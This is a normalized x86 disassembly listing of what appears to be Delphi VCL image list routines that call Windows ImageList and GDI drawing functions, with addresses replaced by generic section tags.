call sub_4032a8
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a47d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_42af8c
mov eax [ ebp - 0x4 ]
call sub_459fe8
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a1a4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a1c4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
sub_45a4d8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebp eax
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebp
call sub_459fe0
test al al
je r-xdata
test bl bl
je r-xdata
cmp edi 0xffffffff
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebp + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push edi
push 0x1
mov eax esi
call sub_429e14
mov edx eax
xor ecx ecx
mov eax ebp
call sub_45aa58
mov eax ebp
call sub_45a540
cmp edi eax
jl r-xdata
mov bl 0x1
sub_45a540
push ebx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45a1b4
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_45a564
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a77b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_459fe0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a782
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45ae00
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a3bc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
push ebp
push sub_45a72c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a70c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a6ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42acd0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_429e14
call sub_425570
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45a1b4
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_429e14
call sub_425570
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45a1b4
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_45a1b4
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a6f6
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_45a78c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a80b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45a540
cmp esi eax
jl r-xdata
mov eax ebx
call sub_459fe0
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax ebx
mov si 0xffef
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a812
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push esi
mov eax ebx
call sub_45a1b4
push eax
call ImageList_Remove
sub_45a824
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_459ddc
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4034a4
pop esi
pop ebx
retn
sub_45a85c
push ebx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_45a1b4
push eax
call ImageList_GetBkColor
call sub_459dfc
pop ebx
retn
sub_45a884
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_459ddc
push eax
mov eax ebx
call sub_45a85c
call sub_459ddc
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425570
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a1b4
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424c70
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_429e14
pop edx
call sub_4250a4
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_429e14
call sub_425570
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a1b4
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_417298
mov eax [ ebx + 0x54 ]
call sub_429e14
call sub_425570
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424c70
mov eax edi
call sub_425570
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424c70
mov eax edi
call sub_425570
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42acd0
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_45aa58
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45aa7c
pop ebx
pop ebp
retn 0xc
sub_45aa7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45aac8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417298
mov eax [ ebp - 0x4 ]
call sub_45b75c
xor eax eax
push ebp
push sub_45ac61
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ac44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45ac27
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42acd0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac2e
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_429e14
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4250a4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425570
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_429e14
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4250a4
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425570
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a2f0
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45ac70
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a1b4
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45aac8
sub_45ac90
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_45a218
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418f24
mov eax ebx
call sub_45a818
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45ae78
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_45a1b4
mov edx eax
mov eax ebx
call sub_45a0b8
mov eax ebx
call sub_459fe0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a1b4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_459fe8
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a1b4
push eax
call ImageList_GetBkColor
call sub_459dfc
mov edx eax
mov eax ebx
call sub_45a824
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45ac70
jmp r-xdata
sub_45ad50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419008
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45ae78
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45a818
mov eax esi
call sub_45a1b4
mov edx eax
mov eax ebx
call sub_45a0b8
mov eax ebx
call sub_459fe0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a1b4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_459fe8
jmp r-xdata
mov eax esi
call sub_45a1b4
push eax
call ImageList_GetBkColor
call sub_459dfc
mov edx eax
mov eax ebx
call sub_45a824
mov edx esi
mov eax ebx
call sub_45ac70
pop esi
pop ebx
retn
sub_45ae00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ae6c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae73
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45aea0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4188d4
mov si 0xffff
call sub_4034a4
inc ebp
dec edi
jne r-xdata
sub_45aef0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4187c4
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4188d4
cmp ebp eax
jne r-xdata
sub_45af48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407fd4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45af8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_45a540
mov ebx eax
mov eax edi
call sub_45a540
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_45a540
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b068
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b04b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45af48
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b052
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
mov eax edi
call sub_45a540
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45b07c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45a540
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45af8c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45b0d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4212c0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45b07c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b130
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b224
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b224
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b3b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41aff8
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41b018
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b397
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42acd0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417298
mov eax [ ebp - 0x4 ]
call sub_45b75c
xor eax eax
push ebp
push sub_45b37a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b381
mov eax [ ebp - 0xc ]
call sub_4032a8
mov eax [ ebp - 0x14 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
call sub_45b760
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4172c0
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_429e14
push eax
mov eax [ ebp - 0xc ]
call sub_429e14
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424f70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4172c0
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
push eax
mov eax [ ebp - 0x14 ]
call sub_429e14
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424f70
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a2f0
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45b3c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a54
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b424
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b42b
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub eax 0xffffffec
sub_45b42b
mov eax [ ebp - 0x4 ]
call sub_459fe0
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b55a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b018
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b784
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b018
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41b018
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a54
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b53d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41b018
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b018
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_45b58c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45a218
mov eax edi
call sub_41aff8
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
